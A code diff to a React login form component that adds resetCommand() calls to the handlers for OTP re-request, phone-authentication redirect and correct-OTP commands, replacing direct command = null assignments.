@@ -66,14 +66,17 @@ export default function LoginForm() {
         if (command === 'REQUEST_AUTH_OTP_AGAIN') {
             setIsLoading(false);
             setInvalid(true);
+            resetCommand(); 
         } else if (command === 'REQUEST_EMAIL_OTP_AGAIN') {
             setIsLoading(false);
             setInvalid(true);
+            resetCommand(); 
         } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
             setIsLoading(false);
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
+                resetCommand(); 
                 router.push('/NumAuthenticationPage');
             }, 1500);
         } else if (command === 'CORRECT_OTP') {
@@ -83,10 +86,10 @@ export default function LoginForm() {
             // Only close if the modal type matches the expected OTP type
             if (modal === 'AuthApp') {
                 setDisplayModal(false);
-                command = null;
+                resetCommand(); 
             } else if (modal === 'Email') {
                 setDisplayModal(false);
-                command = null;
+                resetCommand(); 
             }
         }
     }, [command, modal, setDisplayModal]);
